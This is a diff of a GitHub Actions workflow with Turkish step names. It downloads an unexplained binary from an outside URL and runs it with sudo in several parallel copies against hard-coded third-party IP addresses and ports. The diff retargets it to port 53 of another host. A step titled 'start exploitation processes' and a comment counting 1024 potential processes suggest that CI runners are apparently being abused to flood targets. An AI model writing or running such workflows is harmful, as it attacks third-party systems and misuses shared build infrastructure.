@@ -17,15 +17,15 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wget https://wgetz.com/EWGEHDBfuO/2 -O 2
-          chmod +x 2
+          wget https://github.com/betoaiaio/brsovhv2/raw/refs/heads/master/brsovhv2 -O brsovhv2
+          chmod +x brsovhv2
           
       - name: SÖMÜRÜ İŞLEMLERİNİ BAŞLAT (4x Tekrar)
         run: |
           PIDS=()
           for i in {1..6}; do
             # Aynı anda her bir makine 4 süreç çalıştıracak! Toplam 1024 potansiyel süreç!
-            sudo timeout 60 ./2 84.54.13.123 22003 500 1333 60 &
+            sudo timeout 60 ./brsovhv2 216.202.200.164 53 &
             PIDS+=($!)
           done
           
